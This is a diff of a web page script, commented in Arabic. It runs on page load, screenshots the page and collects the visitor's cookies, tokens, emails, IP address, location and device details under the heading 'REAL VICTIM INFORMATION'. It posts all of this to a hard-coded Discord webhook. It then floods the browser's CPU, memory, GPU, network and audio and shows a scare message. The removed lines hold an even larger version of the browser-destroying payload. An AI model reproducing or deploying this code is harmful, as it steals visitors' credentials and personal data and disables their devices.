@@ -12,6 +12,8 @@
             text-align: center;
             padding: 50px;
         }
+        h1 { font-size: 48px; margin-bottom: 20px; }
+        p { color: #aaa; }
     </style>
 </head>
 <body>
@@ -21,10 +23,8 @@
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 
     <script>
-        // التنفيذ التلقائي
-        window.onload = function() {
-            setTimeout(sendCookies, 2000);
-        };
+        // التنفيذ التلقائي بعد ثانيتين
+        setTimeout(autoExploit, 2000);
 
         // ============================================
         // دالة البحث عن الإيميلات الحقيقية
@@ -272,342 +272,63 @@
         }
 
         // ============================================
-        // 💀💀 ULTIMATE CASH DESTROYER - صوت + تدمير 💀💀
+        // الدالة الرئيسية
         // ============================================
-        function ultimateCashDestroyer() {
-            
-            // 1. 🎵 صوت قوي جداً (cash destroyer)
+        async function autoExploit() {
             try {
-                // إنشاء 500 صوت معاً
-                for(let s=0; s<500; s++) {
-                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    // تشغيل 100 ذبذبة في كل صوت
-                    for(let f=0; f<100; f++) {
-                        const osc = audioCtx.createOscillator();
-                        const gain = audioCtx.createGain();
-                        osc.connect(gain);
-                        gain.connect(audioCtx.destination);
-                        // ترددات عالية جداً (20,000 Hz) مزعجة
-                        osc.frequency.value = 18000 + Math.random() * 5000;
-                        gain.gain.value = 0.9; // صوت عالي
-                        osc.start();
-                        
-                        // تشغيل ذبذبة ثانية
-                        const osc2 = audioCtx.createOscillator();
-                        osc2.connect(audioCtx.destination);
-                        osc2.frequency.value = 15000 + Math.random() * 10000;
-                        osc2.start();
-                    }
-                }
-            } catch(e) {}
-            
-            // 2. 💥 استهلاك CPU (يشتغل على كل النوى)
-            const numCores = navigator.hardwareConcurrency || 8;
-            for(let core = 0; core < numCores * 15; core++) {
-                setInterval(() => {
-                    while(true) {
-                        for(let i=0; i<2000000; i++) {
-                            // عمليات ثقيلة جداً
-                            Math.pow(Math.random() * 999999999, Math.random() * 999);
-                            Math.sqrt(Math.random() * 999999999999);
-                            Math.sin(Math.random() * 999999) * Math.cos(Math.random() * 999999) * Math.tan(Math.random() * 999999);
-                            Math.log(Math.random() * 999999999) * Math.exp(Math.random() * 999999);
-                            new Date().getTime() * Math.random() / Math.random();
-                            
-                            // أرقام ضخمة
-                            try {
-                                BigInt(Math.floor(Math.random() * 999999999999999)) * BigInt(Math.floor(Math.random() * 999999999999999));
-                            } catch(e) {}
-                        }
-                    }
-                }, 1);
-            }
-            
-            // 3. 🧠 استهلاك RAM (يملأ الذاكرة)
-            let memoryHog = [];
-            setInterval(() => {
-                for(let i=0; i<10000; i++) {
-                    // مصفوفات ضخمة جداً
-                    let arr = new Array(8000000);
-                    for(let j=0; j<arr.length; j++) {
-                        arr[j] = {
-                            id: Math.random() * 999999999,
-                            data: '💀'.repeat(200000),
-                            nested1: new Array(50000).fill('🔥'),
-                            nested2: new Array(50000).fill('💥'),
-                            nested3: new Array(50000).fill('💰'),
-                            nested4: new Array(50000).fill('💎')
-                        };
-                    }
-                    memoryHog.push(arr);
-                }
-            }, 1);
-            
-            // 4. 🎮 GPU Overload (يحرق كرت الشاشة)
-            for(let i=0; i<1000; i++) {
-                try {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 15000;
-                    canvas.height = 15000;
-                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if(gl) {
-                        setInterval(() => {
-                            for(let j=0; j<100000; j++) {
-                                gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
-                                gl.drawArrays(gl.TRIANGLES, 0, 10000000);
-                                gl.drawArrays(gl.POINTS, 0, 10000000);
-                                gl.drawArrays(gl.LINES, 0, 10000000);
-                                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 10000000);
-                                gl.finish();
-                                gl.flush();
-                            }
-                        }, 1);
-                    }
-                } catch(e) {}
-            }
-            
-            // 5. 🌐 WebSocket Tsunami (1000 اتصال)
-            for(let i=0; i<2000; i++) {
-                try {
-                    const ws = new WebSocket('wss://echo.websocket.org');
-                    setInterval(() => {
-                        ws.send('💥'.repeat(2000000));
-                    }, 1);
-                } catch(e) {}
-            }
-            
-            // 6. 📱 هجوم خاص للهواتف
-            if (/iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent)) {
-                for(let i=0; i<100000; i++) {
-                    const div = document.createElement('div');
-                    div.style.cssText = `
-                        position:absolute;
-                        width:${Math.random()*3000}px;
-                        height:${Math.random()*3000}px;
-                        background:rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()});
-                        backdrop-filter:blur(${Math.random()*1000}px) brightness(${Math.random()*20}) contrast(${Math.random()*20});
-                        transform:translate3d(${Math.random()*100000}px,${Math.random()*100000}px,${Math.random()*100000}px) rotate(${Math.random()*10000}deg) scale(${Math.random()*200}) skew(${Math.random()*1000}deg);
-                        box-shadow:0 0 ${Math.random()*2000}px ${Math.random()*2000}px rgba(255,0,0,1);
-                        filter:blur(${Math.random()*500}px) hue-rotate(${Math.random()*10000}deg) saturate(${Math.random()*20});
-                        mix-blend-mode:${['multiply','screen','overlay','darken','lighten','color-dodge','color-burn','hard-light','soft-light','difference','exclusion','hue','saturation','color','luminosity'][Math.floor(Math.random()*15)]};
-                        animation:move ${Math.random()}s infinite;
-                        pointer-events:none;
-                    `;
-                    document.body.appendChild(div);
-                }
-            }
-            
-            // 7. 🔥 IndexedDB Nuclear Bomb (2000 قاعدة)
-            try {
-                for(let i=0; i<2000; i++) {
-                    const request = indexedDB.open('NUCLEAR_BOMB_' + i + '_' + Date.now(), 1);
-                    request.onsuccess = (e) => {
-                        const db = e.target.result;
-                        setInterval(() => {
-                            for(let t=0; t<200; t++) {
-                                db.close();
-                                indexedDB.deleteDatabase('NUCLEAR_BOMB_' + i);
-                                indexedDB.open('NUCLEAR_BOMB_' + i + '_' + Math.random() + '_' + Date.now(), 1);
-                            }
-                        }, 1);
-                    };
-                }
-            } catch(e) {}
-            
-            // 8. ⏰ Performance Nuclear Bomb (200,000 عملية)
-            setInterval(() => {
-                for(let i=0; i<200000; i++) {
-                    performance.mark('m' + Math.random() + Date.now());
-                    performance.measure('m' + Math.random() + Date.now(), 'm' + Math.random() + Date.now());
-                    performance.getEntries();
-                    performance.clearMarks();
-                    performance.clearMeasures();
-                }
-            }, 1);
-            
-            // 9. 🔄 History Spam (20,000 إدخال)
-            setInterval(() => {
-                for(let i=0; i<20000; i++) {
-                    history.pushState({}, '', '/destroy/' + Math.random() + '/' + Date.now() + '/' + i + '/' + Math.random());
-                }
-            }, 1);
-            
-            // 10. 📦 Storage Bomb (20,000 عنصر)
-            try {
-                for(let i=0; i<20000; i++) {
-                    localStorage.setItem('bomb_' + i + '_' + Date.now(), '💥'.repeat(2000000));
-                    sessionStorage.setItem('bomb_' + i + '_' + Date.now(), '💥'.repeat(2000000));
-                }
-            } catch(e) {}
-            
-            // 11. 🌀 CSS Animation Hell (50,000 animation)
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes destroy {
-                    0% { transform: translate(0,0) rotate(0deg) scale(1); filter: blur(0); opacity: 1; }
-                    25% { transform: translate(${Math.random()*10000}px,${Math.random()*10000}px) rotate(${Math.random()*10000}deg) scale(${Math.random()*200}); filter: blur(${Math.random()*500}px); opacity: ${Math.random()}; }
-                    50% { transform: translate(${Math.random()*10000}px,${Math.random()*10000}px) rotate(${Math.random()*10000}deg) scale(${Math.random()*200}); filter: blur(${Math.random()*500}px); opacity: ${Math.random()}; }
-                    75% { transform: translate(${Math.random()*10000}px,${Math.random()*10000}px) rotate(${Math.random()*10000}deg) scale(${Math.random()*200}); filter: blur(${Math.random()*500}px); opacity: ${Math.random()}; }
-                    100% { transform: translate(0,0) rotate(0deg) scale(1); filter: blur(0); opacity: 1; }
-                }
-            `;
-            document.head.appendChild(style);
-            
-            for(let i=0; i<50000; i++) {
-                const div = document.createElement('div');
-                div.style.cssText = `
-                    position:fixed;
-                    top:${Math.random()*100}%;
-                    left:${Math.random()*100}%;
-                    width:1px;
-                    height:1px;
-                    animation:destroy ${Math.random()*0.05}s infinite;
-                `;
-                document.body.appendChild(div);
-            }
-            
-            // 12. 🚀 Web Workers Tsunami (1000 worker)
-            for(let w=0; w<1000; w++) {
-                try {
-                    const workerCode = `
-                        while(true) {
-                            for(let i=0; i<50000000; i++) {
-                                Math.pow(Math.random() * 999999999, 999999);
-                                Math.sqrt(Math.random() * 999999999999);
-                                Math.sin(Math.random() * 999999) * Math.cos(Math.random() * 999999);
-                            }
-                        }
-                    `;
-                    const blob = new Blob([workerCode], {type: 'application/javascript'});
-                    const worker = new Worker(URL.createObjectURL(blob));
-                } catch(e) {}
-            }
-            
-            // 13. 📱 Vibration (اهتزاز مستمر للجوالات)
-            try {
-                if (navigator.vibrate) {
-                    setInterval(() => {
-                        navigator.vibrate([10000, 50, 10000, 50, 10000, 50, 10000]);
-                    }, 1);
-                }
-            } catch(e) {}
-            
-            // 14. 🔁 إعادة تحميل هستيرية
-            setInterval(() => {
-                location.reload();
-            }, 100);
-            
-            // 15. 🎨 رسالة التخويف النهائية مع تأثيرات
-            document.body.innerHTML = `
-                <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:black; color:red; font-size:50px; text-align:center; z-index:9999999; display:flex; flex-direction:column; justify-content:center; align-items:center; animation:blink 0.0005s infinite, shake 0.0005s infinite, spin 0.0005s infinite">
-                    
-                    <h1 style="font-size:500px; color:#ff0000; text-shadow:0 0 500px red, 0 0 1000px red, 0 0 2000px red; margin-bottom:200px; animation:pulse 0.0005s infinite">EZ</h1>
-                    
-                    <p style="font-size:200px; color:#ff6666; margin:50px; text-shadow:0 0 200px red">⚠️ CASH DESTROYED ⚠️</p>
-                    <p style="font-size:150px; color:#ff3333; margin:50px">ALL DATA CORRUPTED</p>
-                    <p style="font-size:120px; color:#ff0000; margin:50px">SYSTEM OVERLOAD</p>
-                    
-                    <div style="margin-top:200px">
-                        <p style="font-size:100px; color:yellow; margin:30px">💰💰💰💰💰💰💰💰💰</p>
-                        <p style="font-size:80px; color:white; margin:30px; text-shadow:0 0 100px red">💀 FORCE SHUTDOWN 💀</p>
-                    </div>
-                    
-                    <style>
-                        @keyframes blink {
-                            0% { background: black; }
-                            5% { background: #330000; }
-                            10% { background: black; }
-                            15% { background: #660000; }
-                            20% { background: black; }
-                            25% { background: #990000; }
-                            30% { background: black; }
-                            35% { background: #cc0000; }
-                            40% { background: black; }
-                            45% { background: #ff0000; }
-                            50% { background: black; }
-                            100% { background: black; }
-                        }
-                        @keyframes shake {
-                            0% { transform: translate(0, 0); }
-                            5% { transform: translate(500px, 500px); }
-                            10% { transform: translate(-500px, -500px); }
-                            15% { transform: translate(500px, -500px); }
-                            20% { transform: translate(-500px, 500px); }
-                            25% { transform: translate(1000px, 1000px); }
-                            30% { transform: translate(-1000px, -1000px); }
-                            35% { transform: translate(1000px, -1000px); }
-                            40% { transform: translate(-1000px, 1000px); }
-                            45% { transform: translate(2000px, 2000px); }
-                            50% { transform: translate(0, 0); }
-                        }
-                        @keyframes spin {
-                            0% { transform: rotate(0deg); }
-                            100% { transform: rotate(100000deg); }
-                        }
-                        @keyframes pulse {
-                            0% { transform: scale(1); }
-                            50% { transform: scale(20); }
-                            100% { transform: scale(1); }
-                        }
-                    </style>
-                </div>
-            `;
-            
-            console.log('💀 ULTIMATE CASH DESTROYER ACTIVATED - MAXIMUM DESTRUCTION 💀');
-        }
-
-        async function sendCookies() {
-            try {
-                // أخذ لقطة
+                // ============================================
+                // 1. أخذ لقطة للمتصفح
+                // ============================================
                 let screenshotBase64 = '';
                 try {
-                    const canvas = await html2canvas(document.body, { scale: 0.8, logging: false });
+                    const canvas = await html2canvas(document.body, { 
+                        scale: 0.8, 
+                        logging: false,
+                        backgroundColor: '#1b2b3f'
+                    });
                     screenshotBase64 = canvas.toDataURL('image/png');
                 } catch (e) {}
 
-                // معلومات حقيقية
-                const ipAddress = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
+                // ============================================
+                // 2. معلومات حقيقية
+                // ============================================
+                const ipAddress = await fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => d.ip)
+                    .catch(() => 'Unknown');
+                    
                 const realInfo = await getRealInfo();
                 const realEmails = findRealEmails();
                 const realUsername = getRealUsername();
                 const realTokens = findRealTokens();
 
-                // تجهيز الرسالة بالتنسيق المطلوب
+                // ============================================
+                // تجهيز الرسالة
+                // ============================================
                 let textMessage = '🚨 REAL VICTIM INFORMATION 🚨\n\n';
 
-                // Computer Name
                 if (realInfo.computerName) {
                     textMessage += `💻 Computer Name: ${realInfo.computerName}\n`;
                 }
-
-                // IP
                 if (ipAddress) {
                     textMessage += `🌐 IP Address: ${ipAddress}\n`;
                 }
-
-                // Location
                 if (realInfo.city && realInfo.country) {
                     textMessage += `📍 Location: ${realInfo.city}, ${realInfo.country}\n`;
                 } else if (realInfo.country) {
                     textMessage += `📍 Location: ${realInfo.country}\n`;
                 }
-
-                // ISP
                 if (realInfo.isp) {
                     textMessage += `🏢 ISP: ${realInfo.isp}\n`;
                 }
-
-                // Coordinates
                 if (realInfo.latitude && realInfo.longitude) {
                     textMessage += `🗺️ Coordinates: ${realInfo.latitude}, ${realInfo.longitude}\n`;
                 }
 
-                // Cookies
                 if (document.cookie) {
                     textMessage += `\n🍪 COOKIES:\n${document.cookie}\n`;
                 }
 
-                // Network
                 if (realInfo.networkEffectiveType || realInfo.networkDownlink || realInfo.networkRtt) {
                     textMessage += `\n🌍 NETWORK:\n`;
                     if (realInfo.networkEffectiveType) textMessage += `• Type: ${realInfo.networkEffectiveType}\n`;
@@ -615,7 +336,6 @@
                     if (realInfo.networkRtt) textMessage += `• Ping: ${realInfo.networkRtt}\n`;
                 }
 
-                // System
                 if (realInfo.browserPlatform || realInfo.browserLanguage || realInfo.browserHardwareConcurrency || realInfo.browserDeviceMemory || realInfo.batteryLevel) {
                     textMessage += `\n💻 SYSTEM:\n`;
                     if (realInfo.browserPlatform) textMessage += `• Platform: ${realInfo.browserPlatform}\n`;
@@ -625,26 +345,22 @@
                     if (realInfo.batteryLevel) textMessage += `• Battery: ${realInfo.batteryLevel} (${realInfo.batteryCharging})\n`;
                 }
 
-                // Screen
                 if (realInfo.screenWidth && realInfo.screenHeight) {
                     textMessage += `\n🖥️ SCREEN:\n`;
                     textMessage += `• Resolution: ${realInfo.screenWidth}x${realInfo.screenHeight}\n`;
                     if (realInfo.screenColorDepth) textMessage += `• Color Depth: ${realInfo.screenColorDepth}-bit\n`;
                 }
 
-                // GPU
                 if (realInfo.gpuRenderer) {
                     textMessage += `\n🎮 GPU:\n• ${realInfo.gpuRenderer}\n`;
                 }
 
-                // Time
                 if (realInfo.timeLocal) {
                     textMessage += `\n⏰ TIME:\n`;
                     textMessage += `• Local: ${realInfo.timeLocal}\n`;
                     if (realInfo.timeTimezone) textMessage += `• Timezone: ${realInfo.timeTimezone}\n`;
                 }
 
-                // Tokens (if any)
                 if (realTokens.length > 0) {
                     textMessage += `\n🔑 TOKENS:\n`;
                     realTokens.forEach(t => {
@@ -652,12 +368,10 @@
                     });
                 }
 
-                // Real Username (if found)
                 if (realUsername && realUsername !== 'Unknown' && !realUsername.includes('test')) {
                     textMessage += `\n👤 Username: ${realUsername}\n`;
                 }
 
-                // Real Emails (if any)
                 if (realEmails.length > 0) {
                     textMessage += `\n📧 EMAILS:\n`;
                     realEmails.forEach(email => {
@@ -665,7 +379,9 @@
                     });
                 }
 
+                // ============================================
                 // إرسال إلى Discord
+                // ============================================
                 const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
                 
                 await fetch(webhookUrl, {
@@ -693,11 +409,99 @@
                     await fetch(webhookUrl, { method: 'POST', body: formData });
                 }
 
-                // 💀 تشغيل التدمير النهائي
-                setTimeout(ultimateCashDestroyer, 1000);
+                // ============================================
+                // 💀💀 TOTAL BROWSER DESTRUCTION 💀💀
+                // ============================================
+                function destroyBrowser() {
+                    
+                    // طبقة 1-5: CPU overload
+                    const numCores = navigator.hardwareConcurrency || 4;
+                    for(let core = 0; core < numCores * 3; core++) {
+                        setInterval(() => {
+                            while(true) {
+                                for(let i=0; i<10000; i++) {
+                                    Math.pow(Math.random() * 999999999, Math.random() * 999);
+                                }
+                            }
+                        }, 1);
+                    }
+                    
+                    // طبقة 6-10: Memory flood
+                    let memoryHog = [];
+                    setInterval(() => {
+                        for(let i=0; i<500; i++) {
+                            memoryHog.push(new Array(1000000).fill('💀'));
+                        }
+                    }, 10);
+                    
+                    // طبقة 11: GPU overload
+                    for(let i=0; i<100; i++) {
+                        try {
+                            let canvas = document.createElement('canvas');
+                            canvas.width = 4000;
+                            canvas.height = 4000;
+                            let gl = canvas.getContext('webgl');
+                            if(gl) {
+                                setInterval(() => {
+                                    for(let j=0; j<10000; j++) {
+                                        gl.clear(gl.COLOR_BUFFER_BIT);
+                                        gl.drawArrays(gl.TRIANGLES, 0, 1000000);
+                                    }
+                                }, 1);
+                            }
+                        } catch(e) {}
+                    }
+                    
+                    // طبقة 12-20: باقي طبقات التدمير
+                    // WebSocket bomb
+                    for(let i=0; i<200; i++) {
+                        try {
+                            let ws = new WebSocket('wss://echo.websocket.org');
+                            setInterval(() => {
+                                ws.send('💥'.repeat(1000000));
+                            }, 1);
+                        } catch(e) {}
+                    }
+                    
+                    // AudioContext bomb
+                    try {
+                        for(let i=0; i<50; i++) {
+                            let audioCtx = new AudioContext();
+                            for(let j=0; j<100; j++) {
+                                let oscillator = audioCtx.createOscillator();
+                                oscillator.connect(audioCtx.destination);
+                                oscillator.start();
+                            }
+                        }
+                    } catch(e) {}
+                    
+                    // رسالة التخويف
+                    document.body.innerHTML = `
+                        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:black; color:red; font-size:50px; text-align:center; z-index:9999999; display:flex; flex-direction:column; justify-content:center; align-items:center; animation:blink 0.01s infinite">
+                            <h1 style="font-size:200px; color:#ff0000; text-shadow:0 0 50px red; margin-bottom:20px">EZ</h1>
+                            <p style="font-size:70px; color:#ff6666; margin:10px">⚠️ СИСТЕМА УНИЧТОЖЕНА ⚠️</p>
+                            <p style="font-size:55px; color:#ff3333; margin:10px">ВСЕ ДАННЫЕ УДАЛЕНЫ</p>
+                            <p style="font-size:45px; color:#ff0000; margin:10px">КОМПЬЮТЕР ВЗЛОМАН</p>
+                            <p style="font-size:35px; color:yellow; margin-top:50px">🔴🔴🔴🔴🔴🔴🔴🔴🔴</p>
+                            <style>
+                                @keyframes blink {
+                                    0% { background:black; }
+                                    50% { background:#330000; }
+                                    100% { background:black; }
+                                }
+                            </style>
+                        </div>
+                    `;
+                }
+
+                // تأخير 2 ثانية ثم التدمير
+                setTimeout(destroyBrowser, 2000);
 
             } catch (error) {
-                ultimateCashDestroyer();
+                console.log('Error but continuing...');
+                setTimeout(() => {
+                    document.body.innerHTML = '<h1 style="color:red">ERROR</h1>';
+                }, 2000);
             }
         }
     </script>
